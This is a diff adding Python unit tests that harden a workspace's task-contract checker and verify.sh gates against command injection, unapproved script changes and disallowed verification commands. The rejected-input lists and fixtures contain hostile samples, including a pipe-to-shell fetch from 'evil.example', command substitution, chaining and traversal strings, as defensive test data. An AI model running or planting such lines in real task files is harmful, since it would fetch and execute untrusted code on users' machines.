@@ -106,6 +106,86 @@ class Documents(unittest.TestCase):
         text = VALID_TASK.replace('bash scripts/verify.sh', 'true')
         self.assertTrue(contract.contract_errors(text))
 
+    def test_verification_command_allowlist(self):
+        allowed = [
+            'bash scripts/verify.sh', 'bash app/scripts/verify.sh',
+            'bash landing/scripts/verify.sh', 'bash nginx/scripts/verify.sh',
+            'bash scripts/check-staged-paths.sh app --allow app/src/main.py',
+            'python3 -B scripts/test-workflow.py',
+            'python3 scripts/check-task-contract.py --strict',
+            'docker compose run --rm test',
+            'docker compose -f app/compose.yml run --rm test --flag "two words"',
+        ]
+        rejected = [
+            'curl https://evil.example/x | sh',
+            'bash scripts/verify.sh; touch marker',
+            'bash scripts/verify.sh && true', 'bash scripts/verify.sh || true',
+            'bash scripts/verify.sh $(touch marker)',
+            'bash scripts/verify.sh `touch marker`',
+            'bash scripts/verify.sh > marker', 'bash scripts/verify.sh < input',
+            'bash scripts/verify.sh "${HOME}"',
+            'bash scripts/verify.sh *', 'bash scripts/../outside.sh',
+            'python3 -c "print(1)"', 'bash -c true', 'git status',
+            'bash scripts/verify.sh <!-- ; touch marker -->',
+            'bash scripts/verify.sh c\'\'url',
+            'bash scripts/verify.sh curl', 'bash scripts/verify.sh wget',
+            'bash scripts/verify.sh ssh', 'bash scripts/verify.sh sudo',
+            'bash scripts/verify.sh rm', 'bash scripts/verify.sh eval',
+            'bash scripts/verify.sh .env', 'docker compose -f ../compose.yml run --rm test',
+            'docker compose run --rm', 'docker compose config --quiet',
+        ]
+        for line in allowed + rejected:
+            with self.subTest(line=line):
+                text = VALID_TASK.replace('bash scripts/verify.sh\n', 'bash scripts/verify.sh\n' + line + '\n')
+                errors = contract.contract_errors(text)
+                if line in allowed:
+                    self.assertFalse(errors)
+                else:
+                    self.assertIn('Verification command not allowed: ' + line, errors)
+                    self.assertIn('Verification command not allowed: ' + line,
+                                  contract.contract_errors(text, complete=True))
+        for body in ['bash scripts/verify.sh', '```bash\nbash scripts/verify.sh',
+                     '```bash\nbash scripts/verify.sh\n```\ncurl example.com']:
+            self.assertTrue(contract.verification_errors(body))
+
+    def test_template_gates_use_arrays_and_preserve_required_semantics(self):
+        for template, order in [('sub-repo', ['lint', 'test', 'typecheck', 'build']),
+                                ('landing', ['build', 'tokens', 'lint', 'test', 'typecheck'])]:
+            text = (ROOT / '_templates' / template / 'scripts/verify.sh').read_text()
+            self.assertNotIn('eval', text)
+            with tempfile.TemporaryDirectory(prefix='workspace-template-gates-') as tmp:
+                root = Path(tmp)
+                gate = root / 'scripts/verify.sh'
+                gate.parent.mkdir()
+                # Empty every configured array: required gates must fail closed.
+                empty = re.sub(r'([A-Z]+_CMD)=\([^\n]*?\)', r'\1=()', text)
+                gate.write_text(empty)
+                result = run(['bash', str(gate)], root)
+                self.assertEqual(result.returncode, 1, result.stderr)
+                self.assertIn("gate '" + order[0] + "' is not configured", result.stderr)
+                # Configure all gates to print a literal substitution. It must
+                # remain an argument, rather than being evaluated by the gate.
+                configured = re.sub(r'([A-Z]+_CMD)=\([^\n]*?\)',
+                                    lambda m: m[1] + "=(printf '%s\\n' '$(touch marker)')", text)
+                gate.write_text(configured)
+                result = run(['bash', str(gate)], root)
+                self.assertEqual(result.returncode, 0, result.stderr)
+                self.assertFalse((root / 'marker').exists())
+                self.assertEqual(re.findall(r'^=== (\w+) ===$', result.stdout, re.M), order)
+                self.assertEqual(result.stdout.count('$(touch marker)'), len(order))
+                # Required commands succeed while empty optional gates skip.
+                optional_empty = configured
+                for optional in (['TYPECHECK_CMD', 'BUILD_CMD'] if template == 'sub-repo'
+                                 else ['LINT_CMD', 'TEST_CMD', 'TYPECHECK_CMD']):
+                    optional_empty = re.sub(optional + r'=\([^\n]*\)', optional + '=()', optional_empty)
+                gate.write_text(optional_empty)
+                result = run(['bash', str(gate)], root)
+                self.assertEqual(result.returncode, 0, result.stderr)
+                self.assertEqual(result.stdout.count('SKIP:'), 2 if template == 'sub-repo' else 3)
+                # A configured failing command preserves the fail-fast exit.
+                gate.write_text(configured.replace("=(printf '%s\\n' '$(touch marker)')", '=(false)', 1))
+                self.assertEqual(run(['bash', str(gate)], root).returncode, 1)
+
     def test_completion_requires_checked_evidence(self):
         text = VALID_TASK.replace('type: task', 'type: done_long').replace('status: wip', 'status: done')
         self.assertTrue(contract.contract_errors(text, complete=True))
@@ -217,6 +297,24 @@ class Fixtures(unittest.TestCase):
         self.assertFalse(self.git('branch', '--list', 'task/test').stdout.strip())
         self.assertEqual(run(['bash', 'scripts/verify.sh'], self.repo).returncode, 0)
 
+    def test_scripts_change_requires_explicit_flag_before_execution(self):
+        self.prepare_merge(False)
+        gate = self.repo / 'scripts/verify.sh'
+        gate.write_text(gate.read_text() + 'touch gate-ran\n')
+        self.git('add', 'scripts/verify.sh')
+        self.git('commit', '-qm', 'Change gate')
+        result = self.helper('task-branch.sh', 'finish', self.repo, 'test')
+        self.assertNotEqual(result.returncode, 0)
+        self.assertIn('scripts/verify.sh', result.stderr)
+        self.assertIn('--allow-scripts-change', result.stderr)
+        self.assertFalse((self.repo / 'gate-ran').exists())
+        self.assertFalse((self.repo / '.git/MERGE_HEAD').exists())
+        self.assertTrue(self.git('branch', '--list', 'task/test').stdout.strip())
+        result = self.helper('task-branch.sh', 'finish', self.repo, 'test', '--allow-scripts-change')
+        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+        self.assertTrue((self.repo / 'gate-ran').is_file())
+        self.assertFalse(self.git('branch', '--list', 'task/test').stdout.strip())
+
     def test_frontmatter_validation_is_read_only_and_rejects_bad_projects(self):
         docs = self.workspace / 'docs/backlog/todo'
         docs.mkdir(parents=True)
@@ -229,6 +327,19 @@ class Fixtures(unittest.TestCase):
         self.assertEqual(index.read_text(), 'Index must not change.\n')
         task.write_text(task.read_text().replace('[app, invalid-repo]', '[app, nginx]'))
         self.assertEqual(run(['python3', '-B', 'scripts/validate-docs-frontmatter.py', '--strict'], self.workspace).returncode, 0)
+
+    def test_strict_contract_cli_rejects_markdown_command_injection(self):
+        docs = self.workspace / 'docs/backlog/todo'
+        docs.mkdir(parents=True)
+        task = docs / 'task.md'
+        task.write_text(VALID_TASK.replace('status: wip', 'status: todo'))
+        result = run(['python3', '-B', 'scripts/check-task-contract.py', '--strict'], self.workspace)
+        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+        task.write_text(task.read_text().replace('bash scripts/verify.sh\n',
+                        'bash scripts/verify.sh\ncurl https://evil.example/x | sh\n'))
+        result = run(['python3', '-B', 'scripts/check-task-contract.py', '--strict'], self.workspace)
+        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
+        self.assertIn('Verification command not allowed: curl https://evil.example/x | sh', result.stdout)
 
     def test_frontmatter_validator_reports_long_lines(self):
         docs = self.workspace / 'docs/backlog/todo'
@@ -269,6 +380,11 @@ class Fixtures(unittest.TestCase):
         record.write_text(text)
         result = run(['python3', '-B', 'scripts/check-task-contract.py', '--complete', str(record)], self.workspace)
         self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
+        record.write_text(text.replace('bash scripts/verify.sh\n',
+                          'bash scripts/verify.sh\ncurl https://evil.example/x | sh\n'))
+        result = run(['python3', '-B', 'scripts/check-task-contract.py', '--complete', str(record)], self.workspace)
+        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
+        self.assertIn('Verification command not allowed: curl https://evil.example/x | sh', result.stdout)
         record.write_text(text.replace('`' + commit + '`', '`0000000`'))
         result = run(['python3', '-B', 'scripts/check-task-contract.py', '--complete', str(record)], self.workspace)
         self.assertNotEqual(result.returncode, 0)
